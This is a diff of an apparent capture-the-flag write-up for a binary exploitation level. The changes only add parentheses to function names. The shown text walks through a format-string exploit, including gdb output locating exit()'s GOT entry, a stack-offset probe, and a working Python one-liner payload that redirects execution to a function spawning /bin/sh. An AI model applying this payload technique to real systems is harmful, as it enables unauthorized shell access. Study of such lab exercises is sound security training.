@@ -52,9 +52,9 @@ As always we start this level with `radare2` and `gdb` to gather informations:
 [0x080483f0]>
 ```
 
-The function `o` has a call to `/bin/sh` but isn't called by the program, so we're going to try and call it ourselves !
-Since we want to execute a function, we are going to try and **replace `exit`'s call with a call to `o`**.
-Using `gdb` we find `exit`'s GOT address:
+The function `o()` has a call to `/bin/sh` but isn't called by the program, so we're going to try and call it ourselves !
+Since we want to execute a function, we are going to try and **replace `exit()`'s call with a call to `o()`**.
+Using `gdb` we find `exit()`'s GOT address:
 ```bash
 (gdb) disas exit
 Dump of assembler code for function exit@plt:
@@ -71,7 +71,7 @@ AAAA %x %x %x %x %x
 AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
 ```
 
-Now that we know this, we're going to convert `o`'s address in dec, `0x080484a4 = 134513828 - 4 = 134513824` (4 chars removed for the address).
+Now that we know this, we're going to convert `o()`'s address in dec, `0x080484a4 = 134513828 - 4 = 134513824` (4 chars removed for the address).
 And we craft a script to finally exploit it:
 ```bash
 (python -c 'print "\x38\x98\x04\x08" + "%134513824c%4$n"' && cat) | ./level5
